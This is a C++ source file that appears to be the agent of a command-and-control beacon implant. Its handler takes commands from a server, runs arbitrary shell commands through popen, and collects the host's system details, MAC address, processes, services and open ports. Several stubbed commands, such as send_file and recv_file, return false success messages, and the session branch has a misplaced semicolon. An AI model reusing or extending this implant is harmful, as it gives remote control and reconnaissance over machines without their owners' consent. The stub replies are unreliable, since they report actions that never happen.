#include <iostream>
#include <vector>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>
#include <sstream>
#include <string>
#include <sys/utsname.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <cstring>

#include "../../Generic/logging.hpp"   
#include "../../Generic/session/session.hpp"

std::string executeShellCommand(const char* cmd) {
    logger.log(std::string("Executing shell command: " + std::string(cmd)));
    std::array<char, 2048> buffer;
    std::string result;
    std::unique_ptr<FILE, int(*)(FILE*)> pipe(popen(cmd, "r"), static_cast<int(*)(FILE*)>(pclose));
    if (!pipe) {
        logger.error("popen() failed!");
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    logger.log("Shell command executed successfully.");
    return result;
}

std::string getMacAddress() {
    char iface[] = "eth0";
    logger.log(std::string("Retrieving MAC address for interface: ") + iface);
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        logger.error("socket() failed while retrieving MAC address");
        perror("socket");
        return "Error retrieving MAC address";
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        logger.error("ioctl() failed while retrieving MAC address");
        perror("ioctl");
        close(fd);
        return "Error retrieving MAC address";
    }

    close(fd);

    unsigned char *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
    char mac_address[18];
    snprintf(mac_address, sizeof(mac_address), "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    logger.log("MAC address successfully retrieved.");
    return std::string(mac_address);
}

std::string getSystemInfo() {
    logger.log("Retrieving system information.");
    std::stringstream ss;

    struct utsname uname_info;
    if (uname(&uname_info) != 0) {
        logger.error("uname() call failed");
        perror("uname");
        return "Error retrieving system info";
    }

    std::string mac_address = getMacAddress();

    ss << "System = " << uname_info.sysname << "\n"
       << "platform-release = " << uname_info.release << "\n"
       << "platform-version = " << uname_info.version << "\n"
       << "architecture = " << uname_info.machine << "\n"
       << "hostname = " << uname_info.nodename << "\n"
       << "mac-address = " << mac_address << "\n"
       << "processor = " << uname_info.machine << "\n";

    logger.log("System information retrieved successfully.");
    return ss.str();
}

std::string command_handler(const std::string& command, const std::string& command_data, const std::string& uuid){
    logger.log(std::string("Handling command: ") + command + " with UUID: " + uuid);
    
    if (command == "shutdown") {
        logger.log("shutdown command received.");
        // Implement shutdown logic
        return "Not implemented.";
    } else if (command == "switch_beacon") {
        logger.log("switch_beacon command received.");
        return "Not Implemented";
    } else if (command == "shell") { // need to check if it starts with shell, limitation of current beacon on server
        logger.log("shell command received with command_data: " + command_data);
        std::string output = executeShellCommand(command_data.c_str());
        std::cout << "Shell command output: " << output << std::endl;
        return output;
    } else if (command == "list_processes") {
        logger.log("list_processes command received.");
        std::string output = executeShellCommand("ps aux");
        return output;
    } else if (command == "systeminfo") {
        logger.log("systeminfo command received.");
        std::string output = getSystemInfo();
        return output;
    } else if (command == "checkfiles") {
        logger.log("checkfiles command received.");
        // Implement checkfiles logic
        // Example: verify integrity of specific files
        return "File check completed.";
    } else if (command == "send_file") {
        logger.log("send_file command received.");
        // Implement send_file logic
        return "File sent successfully.";
    } else if (command == "recv_file") {
        logger.log("recv_file command received.");
        // Implement recv_file logic
        return "File received successfully.";
    } else if (command == "list_services") {
        logger.log("list_services command received.");
        // Implement list_services logic
        std::string output = executeShellCommand("service --status-all");
        return output;
    } else if (command == "disk_usage") {
        logger.log("disk_usage command received.");
        // Implement disk_usage logic
        std::string output = executeShellCommand("df -h");
        return output;
    } else if (command == "netstat") {
        logger.log("netstat command received.");
        // Implement netstat logic
        std::string output = executeShellCommand("netstat -tuln");
        return output;
    } else if (command == "list_dir") {
        logger.log("list_dir command received.");
        // Implement list_dir logic
        std::string output = executeShellCommand("ls -la");
        return output; 
    } else if (command == "session") {
            logger.log("Starting sessionConnect");
            if (!sessionConnect()) {};
                logger.warn("Could not access session - reconnect initisalised.");  
            logger.warn("Session exiting, http reconnect");
            return "Reconnected via HTTP";
    } else {
        logger.error(std::string("Unknown command received: ") + command);
        std::cerr << "Unknown command: " << command << std::endl;
    }
    return "not a supported command";
}